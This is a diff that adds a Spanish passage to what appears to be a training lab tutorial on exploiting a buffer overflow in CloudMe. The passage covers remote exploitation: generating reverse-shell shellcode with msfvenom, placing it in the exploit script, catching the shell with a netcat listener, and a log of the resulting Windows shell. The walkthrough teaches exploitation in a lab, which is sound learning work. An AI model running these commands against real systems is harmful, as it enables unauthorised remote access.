@@ -768,7 +768,80 @@ exploit()
 Finalmente, podemos ejecutar `CloudMe` (no necesariamente en `x32dbg`) y ejecutar nuestro exploit, y deberíamos ver que se bloquea y debería abrirse una calculadora.
 ## Explotación remota
 
+omo hemos creado y probado nuestro exploit, ahora podemos intentar ejecutarlo en un servidor remoto real. Podemos usar el mismo exploit en el objetivo real y solo tenemos que cambiar el `IP`y `port`en nuestro script para apuntarlo al nuevo objetivo y cambiar el shellcode que usamos dentro del script a algo que nos envíe un shell inverso.
 
+---
+
+## Código de shell de shell inverso
+
+Primero, necesitamos encontrar la IP de nuestra máquina, a la que debería poder acceder el servidor remoto (en la misma subred de la red):
+
+  Explotación remota
+
+```shell-session
+0xRh4ps00dy@htb[/htb]$ ip -4 a
+
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    ...SNIP...
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
+    ...SNIP...
+3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
+    ...SNIP...
+5: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 100
+    inet 10.10.15.10/23 brd 10.10.15.255 scope global tun0
+```
+
+La IP que usaremos es `tun0`la IP de , ya que nuestra VM está en la misma `10.10.`subred.
+
+Nota: Debes estar conectado a la VPN para poder interactuar con el servidor remoto, así que descarga la clave de VPN en caso de que quieras ejecutar el exploit desde tu propia máquina. La instancia de PwnBox ya está conectada a la VPN, por lo que deberías poder conectarte al servidor remoto.
+
+A continuación, generaremos el shellcode que nos enviará un shell inverso, el cual podemos obtener con el `windows/shell_reverse_tcp`payload en `msfvenom`, de la siguiente manera:
+
+  Explotación remota
+
+```shell-session
+0xRh4ps00dy@htb[/htb]$ msfvenom -p 'windows/shell_reverse_tcp' LHOST=10.10.15.10 LPORT=1234 -f 'python'
+
+...SNIP...
+buf =  b""
+buf += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
+...SNIP...
+```
+
+Podemos modificar nuestro exploit copiando la salida y usándola en la `exploit()`función de la `buf`variable.
+
+---
+
+## Explotación remota
+
+Después de esto, podemos iniciar un `netcat`listener para recibir el shell inverso, de la siguiente manera:
+
+  Explotación remota
+
+```shell-session
+0xRh4ps00dy@htb[/htb]$ nc -lvnp 1234
+
+listening on [any] 1234 ...
+```
+
+Una vez que estemos escuchando, podemos ejecutar nuestra carga útil `python win32bof_exploit_remote.py`y esperar a que el servidor remoto nos envíe un shell inverso si nuestra explotación fue exitosa.
+
+  Explotación remota
+
+```shell-session
+0xRh4ps00dy@htb[/htb]$ nc -lvnp 1234
+
+listening on [any] 1234 ...
+connect to [10.10.15.10] from (UNKNOWN) [10.10.10.10] 64539
+Microsoft Windows [Version 10.0.19042.928]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\htb-student\AppData\Local\Programs\CloudMe\CloudMe>whoami
+whoami
+htb-student
+```
+
+Como podemos ver, sin tener acceso local al servidor remoto, hemos explotado con éxito el servicio remoto y hemos recibido un shell inverso. Esto nos muestra que si depuramos correctamente el programa, podemos crear y probar nuestro exploit localmente y luego ejecutarlo en cualquier servidor remoto con el programa vulnerable escuchando conexiones remotas.
 
 
 
